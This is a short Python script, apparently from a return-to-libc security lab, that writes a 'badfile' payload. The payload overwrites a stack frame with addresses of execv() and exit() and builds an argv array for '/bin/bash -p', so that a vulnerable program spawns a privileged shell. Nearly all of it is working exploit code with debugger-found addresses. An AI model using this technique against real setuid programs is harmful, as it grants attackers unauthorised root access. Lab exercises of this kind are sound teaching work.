#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

# task5    
bash_addr = 0xffffd273  # export as MYSHELL=/bin/bash and run ./prtenv
p_addr =  0xffffd382  # export as MYSHEL2 =-p and run ./prtenv
execv_addr = 0xf7e984b0 # get this value by debugging
exit_addr = 0xf7e03f80  # use debugger to get this value p exit 
input_main =  0xffffcbf0 # compile ./retlib

#-------------------------------------------------------------------
# order 
# argv[2] address = NULL 0x00
# argv[1] address = -p 
# argv[0] address = /bin/bash 
# .....
# bash address  = exit() address + 4 
# exit() address = return address  = execv() + 4 
# execv() address = PFP + 4 
#------------------------------------------------------------------
# based on debugger 

Y = 87+4      #PFP, ebp - beginning of buffer address + 4 
arraysize = 200  # pick below 300 

# Construct payload
# fill up execv() address and exit() address values on stack. 
content[Y:Y+4]     = (execv_addr).to_bytes(4,byteorder='little')
Z = 87 + 8 # for execv() 
content[Z:Z+4]   = (exit_addr).to_bytes(4,byteorder='little')

# argv[1]
X = 87 + 12 
content[X:X+4]  = (bash_addr).to_bytes(4,byteorder='little')

# argv[2]
argv = input_main + arraysize 
content[X+4:X+8] = (argv).to_bytes(4,byteorder='little')

# create argv[] array
content[arraysize:arraysize+4]    = (bash_addr).to_bytes(4,byteorder='little')
content[arraysize+4:arraysize+8]  = (p_addr).to_bytes(4,byteorder='little')
content[arraysize+8:arraysize+12] = (0x00).to_bytes(4,byteorder='little')





# Save content to a file
with open("badfile", "wb") as f:
  f.write(content)